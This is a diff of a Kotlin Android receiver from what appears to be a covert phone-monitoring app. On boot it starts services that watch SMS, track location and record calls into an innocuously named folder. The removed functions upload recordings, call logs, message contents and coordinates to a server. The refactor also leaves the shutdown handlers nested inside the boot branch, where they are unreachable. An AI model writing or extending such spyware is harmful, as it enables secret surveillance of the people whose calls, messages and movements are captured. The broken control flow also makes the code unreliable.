@@ -27,6 +27,7 @@ import io.reactivex.schedulers.Schedulers
 import okhttp3.MediaType
 import okhttp3.MultipartBody
 import okhttp3.RequestBody
+import org.jetbrains.anko.runOnUiThread
 import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
@@ -35,170 +36,53 @@ import java.util.*
 class SMSreceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
-            Log.e("antx", "onReceive sms BOOT_COMPLETED")
-            RealmUtils.savePowerOnOff(true)
-            //Handler Power
-            val listPowCaching = RealmUtils.getAllPowerCaching()
-            listPowCaching?.let {
-                it.forEachIndexed { _, powCaching ->
-                    sendPowerCaching(powCaching.id, powCaching.datecreate, powCaching.isPowerOn)
+            context.runOnUiThread {
+                RealmUtils.savePowerOnOff(true)
+                val listPowCaching = RealmUtils.getAllPowerCaching()
+                listPowCaching?.let {
+                    it.forEachIndexed { _, powCaching ->
+                        sendPowerCaching(powCaching.id, powCaching.datecreate, powCaching.isPowerOn)
+                    }
                 }
+                updateInformation()
+                val intentSms = Intent(context, SmsRadarService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intentSms)
+                } else {
+                    context.startService(intentSms)
+                }
+                //Call
+                var callRecord = CallRecord.Builder(context)
+                        .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
+                        .setRecordDirName("Historycontact")
+                        .setRecordDirPath(Environment.getExternalStorageDirectory().path)
+                        .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                        .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                        .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                        .setShowSeed(true)
+                        .build()
 
+                callRecord.startCallRecordService()
+                val intent = Intent()
+                intent.setClass(context, LocationService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intent)
+                } else {
+                    context.startService(intent)
+                }
             }
-            updateInformation()
-            val intentSms = Intent(context, SmsRadarService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intentSms)
-            } else {
-                context.startService(intentSms)
+            //Location
+            if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
+                RealmUtils.savePowerOnOff(false)
             }
-            //Call
-            var callRecord = CallRecord.Builder(context)
-                    .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
-                    .setRecordDirName("Historycontact")
-                    .setRecordDirPath(Environment.getExternalStorageDirectory().path)
-                    .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                    .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
-                    .setShowSeed(true)
-                    .build()
-
-            callRecord.startCallRecordService()
-
-            val intent = Intent()
-            intent.setClass(context, LocationService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
+            if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
+                RealmUtils.savePowerOnOff(false)
             }
-
-        }
-        //Location
-
-        if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
-            Log.e("antx", "onReceive sms QUICKBOOT_POWEROFF")
-            RealmUtils.savePowerOnOff(false)
-        }
-        if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
-            Log.e("antx", "onReceive sms ACTION_SHUTDOWN")
-            RealmUtils.savePowerOnOff(false)
-            //ACTION_SHUTDOWN
-        }
-    }
-
-    private fun isOnline(context: Context): Boolean {
-        try {
-            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-            val netInfo = cm.activeNetworkInfo
-            //should check null because in airplane mode it will be null
-            return netInfo != null && netInfo.isConnected
-        } catch (e: NullPointerException) {
-            e.printStackTrace()
-            return false
-        }
-
-    }
-
-    //file audio local
-    private fun sendCallFail(realmId: Int?, phoneNumber: String?, dateCreate: String?, duration: String?, fileAAudio: String?, lat: String?, lng: String?, type: String?, filePath: String? = "") {
-        val result: HashMap<String, String> = HashMap()
-        result["Authorization"] = RealmUtils.getAuthorization()
-        var id = RealmUtils.getAccountId()
-        var message = CallLogServer(id, phoneNumber,
-                dateCreate, duration, lat, lng, fileAAudio, type.toString())
-        id?.let {
-            Repository.createService(ApiService::class.java, result).insertCallLog(message.toMap(), Constant.KEY_API)
-                    .subscribeOn(Schedulers.io())
-                    .observeOn(AndroidSchedulers.mainThread())
-                    .subscribe(
-                            {
-                                RealmUtils.deleteItemCachingCallLog(realmId)
-                                try {
-                                    val fdelete = File(filePath)
-                                    fdelete.delete()
-                                } catch (e: Exception) {
-
-                                }
-                                Log.e("antx", "sendCallFail sucess")
-
-                            },
-                            { e ->
-                                Log.e("antx", "sendCallFail error" + e.message)
-                            })
 
         }
     }
 
     //file audio server
-    private fun sendRecoderToServer(realmID: Int?, filePath: String?, number: String?, dataCreate: String?, duaration: String?, lat: String?, lng: String?, typeCall: String? = "null") {
-        try {
-            val file = File(filePath)
-            val result: HashMap<String, String> = HashMap()
-            result["Authorization"] = RealmUtils.getAuthorization()
-            var id = RealmUtils.getAccountId()
-            val temp = RequestBody.create(MediaType.parse("multipart/form-data"), file)
-            var imageFile = MultipartBody.Part.createFormData(file.name, file.name, temp)
-            Repository.createService(ApiService::class.java, result).insertUpload(Constant.KEY_API, id, imageFile)
-                    .subscribeOn(Schedulers.io())
-                    .observeOn(AndroidSchedulers.mainThread())
-                    .subscribe(
-                            { result ->
-                                if (result.isNotEmpty()) {
-                                    sendCallFail(realmID, number, dataCreate, duaration, result[0], lat, lng, typeCall.toString(), filePath)
-                                }
-                            },
-                            { e ->
-                                Log.e("test", "sendRcoderToServer  error " + e.message)
-                            })
-        } catch (e: Exception) {
-            Log.e("antx Exception", "sendRcoderToServer " + e.message)
-        }
-
-    }
-
-    private fun insertCachingSms(cachingId: Int?, phoneNunber: String?, datecreate: String?, contentmessage: String?, lat: String?, lng: String?, type: Boolean?) {
-        val result: HashMap<String, String> = HashMap()
-        result["Authorization"] = RealmUtils.getAuthorization()
-        var id = RealmUtils.getAccountId()
-        var message = SmsSendServer(id, phoneNunber,
-                datecreate, lat, lng, contentmessage, type)
-        Log.e("datatCachingSms", " " + message.toString())
-        id?.let {
-            Repository.createService(ApiService::class.java, result).insertMessage(message.toMap(), Constant.KEY_API)
-                    .subscribeOn(Schedulers.io())
-                    .retry(3)
-                    .observeOn(AndroidSchedulers.mainThread())
-                    .subscribe(
-                            { result ->
-                                RealmUtils.deleteItemCachingMess(cachingId)
-                            },
-                            { e ->
-                                Log.e("antx", "insertCachingSms eror " + e.message)
-                            })
-        }
-    }
-
-    private fun sendInternetCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
-        val result: HashMap<String, String> = HashMap()
-        result["Authorization"] = RealmUtils.getAuthorization()
-        var id = RealmUtils.getAccountId()
-        var message = PowerAndInternet(id, dateCreate, status)
-        Log.e("datatCachingSms", " " + message.toString())
-        id?.let {
-            Repository.createService(ApiService::class.java, result).insertInternet(message.toMap(), Constant.KEY_API)
-                    .subscribeOn(Schedulers.io())
-                    .observeOn(AndroidSchedulers.mainThread())
-                    .subscribe(
-                            {
-                                RealmUtils.deleteItemInternet(cachingId)
-                            },
-                            { e ->
-                                Log.e("antx", "sendInternetCaching eror " + e.message)
-                            })
-        }
-    }
-
     private fun sendPowerCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
         val result: HashMap<String, String> = HashMap()
         result["Authorization"] = RealmUtils.getAuthorization()
